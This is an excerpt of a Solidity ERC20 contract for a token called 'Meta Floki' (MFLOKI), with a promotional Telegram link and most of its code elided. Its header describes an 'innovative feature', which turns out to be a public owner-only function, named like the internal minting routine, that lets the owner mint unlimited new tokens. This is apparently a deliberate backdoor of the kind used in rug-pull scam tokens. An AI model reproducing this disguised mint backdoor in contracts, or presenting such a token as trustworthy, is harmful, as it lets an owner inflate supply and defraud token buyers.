...
//
// $MetaFloki proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/MetaFloki1000x
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaFloki(uint256 amount) public onlyOwner {
 _MetaFloki(msg.sender, amount);
    }
    ...
    function _MetaFloki(address account, uint256 amount) internal virtual {
...
contract $MetaFloki is ERC20 {
    ...
    constructor() public ERC20("Meta Floki", "MFLOKI") {
     _MetaFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}